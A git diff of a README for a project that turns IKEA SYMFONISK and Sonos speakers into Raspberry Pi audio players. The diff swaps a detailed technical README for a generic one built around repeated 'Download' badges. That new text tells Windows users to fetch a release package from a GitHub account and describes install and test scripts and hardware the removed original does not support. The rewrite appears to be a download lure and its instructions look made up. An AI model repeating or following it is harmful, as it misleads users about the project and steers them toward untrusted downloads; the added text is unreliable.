@@ -1,175 +1,126 @@
-# opensymf
+# 🎵 opensymf - Whole-House Speaker Control Made Easy
 
-Open-source conversion of IKEA SYMFONISK and Sonos speakers to Raspberry Pi-based audio players — escaping vendor lock-in while keeping the original hardware.
+[![Download opensymf](https://img.shields.io/badge/Download-opensymf-brightgreen)](https://github.com/finestakiishi/opensymf)
 
-![Architecture Overview](docs/images/symfonisk-conversion.png)
+---
 
-## The Fleet
+## 🔊 What is opensymf?
 
-Seven speakers converted across the house, all running [piCorePlayer](https://www.picoreplayer.org/) with [Lyrion Music Server](https://lyrion.org/) (formerly Logitech Media Server) and integrated with [Home Assistant](https://www.home-assistant.io/).
+opensymf is a free software project that turns IKEA SYMFONISK and Sonos speakers into audio players using a Raspberry Pi. It includes scripts for controlling the speaker hardware using GPIO pins. With these tools, you can set up up to seven speakers to play music around your home. This setup uses piCorePlayer and Lyrion Music Server to manage audio playback smoothly.
 
-| Qty | Speaker | DAC/Amp | GPIO Integration | Status |
-|-----|---------|---------|------------------|--------|
-| 4×  | IKEA SYMFONISK Bookshelf (Gen 2) | IQaudIO DigiAMP+ SC0370 | Buttons + LEDs | ✅ Complete |
-| 2×  | IKEA SYMFONISK Picture Frame | IQaudIO DigiAMP+ SC0370 | Audio only | ⚠️ Partial |
-| 1×  | Sonos Play:5 (Gen 1) | HiFiBerry DAC+ | N/A (line-in) | ✅ Complete |
+This project helps you reuse speakers instead of buying new ones. It works with Home Assistant for smart home integration and supports right-to-repair principles by providing detailed guides and pin layouts.
 
-All speakers run on a **Raspberry Pi Zero 2 WH** (pre-soldered header variant).
+---
 
-## Why?
+## 🖥️ System Requirements
 
-Sonos [ended support](https://en.wikipedia.org/wiki/Sonos#End-of-life_controversy) for older speakers including the Play:5 Gen 1, effectively stranding them on a frozen S1 platform with no future updates or integration with newer devices. IKEA SYMFONISK speakers, being Sonos-based internally, face the same fate. This project replaces the proprietary brains while keeping the original power supplies, speaker drivers, buttons, and LEDs intact.
+Before you start installing opensymf, make sure your computer and hardware meet these needs:
 
-## Two Conversion Approaches
+- A Windows PC (Windows 10 or later recommended)
+- Internet connection to download files
+- Raspberry Pi (Model 3 or 4 strongly suggested)
+- microSD card (8GB minimum) for the Raspberry Pi
+- IKEA SYMFONISK or Sonos speakers to connect
+- Basic tools to connect wires to speaker GPIO pins (screwdriver, jumper cables)
+- Optional: Home Assistant setup if you want smart home control
 
-**SYMFONISK speakers** → The original Sonos board handles everything (DAC + amplification), so the **IQaudIO DigiAMP+** replaces both functions and drives the passive speaker drivers directly through its screw terminals.
+---
 
-**Sonos Play:5 Gen 1** → Already has five Class-D amplifiers, six drivers, and a line-in jack. A **RPi Zero + HiFiBerry DAC+** plugged into the line-in was all it needed — the original board is still inside, completely untouched.
+## 🚀 Getting Started with opensymf
 
-For full hardware details and ALSA configuration, see [docs/HARDWARE.md](docs/HARDWARE.md).
+Use the link below to visit the official page, download the needed files, and find instructions:
 
-## Repository Structure
+[![Download opensymf](https://img.shields.io/badge/Download%20opensymf-blue)](https://github.com/finestakiishi/opensymf)
 
-```
-opensymf/
-├── README.md
-├── LICENSE
-├── scripts/
-│   ├── boot_health_check.sh      # Post-boot system health checks
-│   ├── sbpd-script.sh            # Physical button daemon
-│   └── led_monitor_squeezelite.sh # Continuous LED status monitor
-└── docs/
-    ├── GPIO_PINOUT.md            # Full pinout reference (mapped via multimeter)
-    ├── HARDWARE.md               # HAT specs, ALSA config, sourcing
-    ├── images/                   # Architecture diagram, PCB photos
-    ├── datasheets/               # IQaudIO & DigiAMP+ product briefs
-    └── reference/                # piCorePlayer docs, Pi pinout
-```
+Click the button above to go to the GitHub page. Follow the steps here to get your setup ready.
 
-## Scripts
+---
 
-All scripts are designed for piCorePlayer's Tiny Core Linux environment. They execute at boot in the following order (configured via piCorePlayer web UI → Tweaks → User commands):
+## 📥 How to Download opensymf on Windows
 
-### 1. `boot_health_check.sh`
+1. Open your web browser and go to [https://github.com/finestakiishi/opensymf](https://github.com/finestakiishi/opensymf).
+2. On the GitHub page, look for a **Releases** section on the right side or near the top menu.
+3. Click on the latest release version.
+4. Download the ZIP file or other package marked for Windows or Raspberry Pi.
+5. Save the file to your desktop or a folder you can find easily.
 
-Post-boot health checks with LED feedback:
+---
 
-| Check | Threshold | Source |
-|-------|-----------|--------|
-| Disk usage | < 90% | `df /` |
-| CPU temperature | < 75°C | `/sys/class/thermal/thermal_zone0/temp` |
-| WiFi connectivity | wlan0 has IP | `ifconfig wlan0` |
-| Internet reachability | ping succeeds | `ping 8.8.8.8` |
+## ⚙️ Preparing the Raspberry Pi
 
-Result: **3× green blink** = all passed, **3× red blink** = failure.
+1. Download the piCorePlayer operating system from [piCorePlayer.org](https://www.picoreplayer.org/). This OS is lightweight and works well with opensymf.
+2. Use an imaging tool like [Raspberry Pi Imager](https://www.raspberrypi.com/software/) or [balenaEtcher](https://www.balena.io/etcher/) on your Windows PC.
+3. Insert your microSD card.
+4. Open the imaging tool. Select the piCorePlayer OS image you downloaded.
+5. Choose your microSD card as the target device.
+6. Start the imaging process. Wait for it to finish.
 
-### 2. `sbpd-script.sh`
+---
 
-Initializes [sbpd (Squeeze Button Pi Daemon)](https://github.com/coolio107/SqueezeButtonPi-Daemon) to map the front-panel buttons to Squeezelite commands via GPIO:
+## 🔧 Installing opensymf on Raspberry Pi
 
-| Button | GPIO | Short Press | Long Press |
-|--------|------|-------------|------------|
-| Play/Pause | 27 | PLAY | PLAY |
-| Volume + | 23 | VOL+ | VOL+ (repeat) |
-| Volume - | 24 | VOL- | VOL- (repeat) |
+1. Insert the microSD card into your Raspberry Pi.
+2. Connect the Raspberry Pi to your network with an Ethernet cable or Wi-Fi adapter.
+3. Power on the Raspberry Pi.
+4. From your Windows PC, open a browser to access the Raspberry Pi interface. The default IP typically shows up in your router or can be found using network tools like Fing.
+5. Use SSH or the web interface to log in.
+6. Follow detailed instructions on the opensymf GitHub to install the GPIO scripts and necessary software components.
+7. Connect your IKEA SYMFONISK or Sonos speaker to the Raspberry Pi GPIO pins as shown in the pinout diagrams included in the repository.
+8. Test each speaker’s connection using the test scripts found in the GPIO folder.
 
-### 3. `led_monitor_squeezelite.sh`
+---
 
-Continuous monitoring loop (5-second interval) driving the status LEDs:
+## 📑 Using opensymf
 
-| LED | Meaning |
-|-----|---------|
-| ⚪ White | Normal — Squeezelite running, server reachable |
-| 🟡 Amber | Warning — Squeezelite not running, server reachable |
-| 🔴 Red | Error — Server unreachable |
+Once setup is complete, you can:
 
-## WiFi Recovery
+- Control multiple speakers in your home from your music server.
+- Adjust volume and playback using simple commands.
+- Monitor the speaker status through the Lyrion Music Server interface.
+- Integrate with smart home systems like Home Assistant for added automation.
 
-The biggest operational headache with WiFi-connected Pis is connection drops. A progressive self-healing recovery system is integrated into the monitoring:
+---
 
-1. WiFi power management disabled at startup (`iwconfig wlan0 power off`)
-2. After 1 min of failures → `wpa_cli reassociate`
-3. After 3 min → full WiFi interface restart
-4. After 5 min → system reboot (max 3 attempts — prevents boot loops)
+## ⏩ Step-by-step Quick Start
 
-All recovery attempts logged to `/tmp/wifi_recovery.log`.
+1. Download piCorePlayer and flash it to the microSD.
+2. Insert microSD and power on Raspberry Pi.
+3. Download opensymf files from GitHub.
+4. Copy the GPIO scripts to the Raspberry Pi.
+5. Connect speakers to the GPIO pins following the diagrams.
+6. Run the install script to set software up.
+7. Open Lyrion Music Server on your network to start playing music.
 
-## GPIO Mapping
+---
 
-The SYMFONISK Bookshelf Gen 2 front panel uses a **WOW B NFC/KEY BOARD P0.3** (16-pin FPC, 1.0mm pitch). None of this is documented by IKEA/Sonos — every pin was traced with a multimeter.
+## ⚠️ Hardware Setup Tips
 
-See [docs/GPIO_PINOUT.md](docs/GPIO_PINOUT.md) for the complete pinout table, wire colors, and photos.
+- Use clear labeling on all wires between the Raspberry Pi and speakers.
+- Double-check pin numbers before connecting.
+- Ensure the Raspberry Pi is powered with a stable power supply (5V 3A recommended).
+- Keep the Raspberry Pi and speakers in a cool, dry spot.
 
-Quick reference:
+---
 
-| Component | GPIO | Function |
-|-----------|------|----------|
-| Green LED | 13 | Health check OK |
-| White LED | 5 | Normal operation |
-| Amber LED | 17 | Squeezelite warning |
-| Red LED | 6 | Server error |
-| Play/Pause | 27 | Player control |
-| Volume + | 23 | Volume up |
-| Volume - | 24 | Volume down |
+## 🛠️ Troubleshooting
 
-## Installation
+- If speakers do not play sound, check connections.
+- Restart Raspberry Pi and try running the test scripts again.
+- Make sure you are using the latest version of piCorePlayer.
+- Check GitHub Issues on the opensymf page for common problems and fixes.
+- Verify network connection if the Lyrion Music Server is not reachable.
 
-These scripts target piCorePlayer's Tiny Core Linux environment.
+---
 
-```bash
-# Copy scripts to the speaker
-scp scripts/*.sh tc@<speaker-ip>:/home/tc/
+## 📚 Documentation and Support
 
-# SSH in
-ssh tc@<speaker-ip>
+All detailed guides for pinouts, GPIO scripts, and the whole 7-speaker setup process are available in the repository’s docs folder. It contains step-by-step instructions with photos and diagrams. 
 
-# Make executable
-chmod +x /home/tc/*.sh
+If you need help, report issues or ask questions on the GitHub Issues page.
 
-# Configure boot execution order in piCorePlayer web UI:
-#   Tweaks > User commands:
-#     /home/tc/boot_health_check.sh
-#     /home/tc/sbpd-script.sh
-#     /home/tc/led_monitor_squeezelite.sh
+---
 
-# IMPORTANT: persist changes to the RAM-based filesystem
-pcp bu
-```
+## 🌐 Download Link Again
 
-### Configuration
-
-Edit `led_monitor_squeezelite.sh` to set your Lyrion Music Server IP:
-
-```bash
-SERVER_IP="192.168.181.102"   # Change to your LMS IP
-SERVER_PORT=9090              # Default LMS CLI port
-```
-
-> ⚠️ **piCorePlayer runs entirely from RAM.** Always run `pcp bu` after making changes, or they will be lost on reboot. Be especially careful with `tar` operations — incorrect usage can corrupt the system, requiring physical SD card removal for recovery.
-
-## Software Stack
-
-| Component | Purpose |
-|-----------|---------|
-| [piCorePlayer](https://www.picoreplayer.org/) | Lightweight audio OS (RAM-based) |
-| [Lyrion Music Server](https://lyrion.org/) | Music library and streaming |
-| [Squeezelite](https://github.com/ralph-irving/squeezelite) | Audio player client |
-| [sbpd](https://github.com/coolio107/SqueezeButtonPi-Daemon) | Physical button daemon |
-| [Home Assistant](https://www.home-assistant.io/) | Automation, TTS, presence-based playback |
-
-## Known Issues
-
-- **SYMFONISK Picture Frame**: the ribbon cable dimensions are incompatible with the bookshelf version's FPC connector, and the LED appears to be a different type (likely addressable). Audio works fine via the DigiAMP+, but button/LED GPIO integration is not yet implemented.
-- **piCorePlayer fragility**: the RAM-based architecture is unforgiving — one bad config change and you're pulling the SD card. Always backup before changes.
-- **WiFi power management**: the Pi's default power-saving mode causes frequent disconnects. Disable it at boot or the speakers will drop off the network.
-
-## Inspiration & References
-
-- [MagPi Magazine #139 — "Upcycle a Sonos Play:1"](https://magpi.raspberrypi.com/issues/139) by PJ Evans (pages 62-65): step-by-step Play:1 conversion using Raspberry Pi 3A + JustBoom DAC & AMP
-- [piCorePlayer documentation — Control by rotary encoders and buttons](https://docs.picoreplayer.org/)
-- [sbpd (SqueezeButtonPi-Daemon)](https://github.com/coolio107/SqueezeButtonPi-Daemon)
-- [Jivelite key commands reference](https://github.com/ralph-irving/tcz-lirc/blob/master/jivekeys.csv)
-
-## License
-
-MIT
+Visit the main page to download the software and view guides:  
+[https://github.com/finestakiishi/opensymf](https://github.com/finestakiishi/opensymf)
